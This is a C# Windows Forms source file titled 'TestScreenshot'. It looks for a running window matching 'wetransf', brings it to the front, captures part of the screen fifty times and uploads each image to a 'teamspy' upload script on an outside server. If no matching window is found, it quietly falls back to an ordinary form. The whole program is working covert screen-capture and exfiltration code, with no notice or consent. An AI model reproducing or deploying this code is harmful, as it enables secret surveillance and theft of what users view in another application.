using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace TestScreenshot
{
    static class Program
    {



        private const int SW_SHOWNORMAL = 1;
        private const int SW_SHOWMINIMIZED = 2;
        private const int SW_SHOWMAXIMIZED = 3;

        [DllImport("user32.dll")]
        private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetForegroundWindow(IntPtr hWnd);

        public static IntPtr FindWindow(string title)
        {
            Process[] processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                if (process.MainWindowTitle.ToLower().Contains(title.ToLower()) ||
                    process.ProcessName.ToLower().Contains(title.ToLower()))
                {
                    return process.MainWindowHandle;
                }
            }
            return IntPtr.Zero;
        }
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            IntPtr hWnd = FindWindow("wetransf");
            if (!hWnd.Equals(IntPtr.Zero))
            {
                // SW_SHOWMAXIMIZED to maximize the window
                // SW_SHOWMINIMIZED to minimize the window
                // SW_SHOWNORMAL to make the window be normal size
                for (int i = 0; i < 50; i++)
                {
                    ShowWindowAsync(hWnd, SW_SHOWNORMAL);

                    SetForegroundWindow(hWnd);
                    Thread.Sleep(300);

                    using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                        {
                            g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X + 20,
                                Screen.PrimaryScreen.Bounds.Y + 250,
                                0, 0,
                                new Size(200, 300),
                                CopyPixelOperation.SourceCopy);
                        }
                        bmpScreenCapture.Save("screen.png", ImageFormat.Png);
                        System.Net.WebClient Client = new System.Net.WebClient();
                        Client.Headers.Add("Content-Type", "binary/octet-stream");
                        byte[] result = Client.UploadFile("http://appboxstudios.com/teamspy/upload.php", "POST", "screen.png");
                        String s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);

                    }
                    Thread.Sleep(3000);
                }
                return;
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
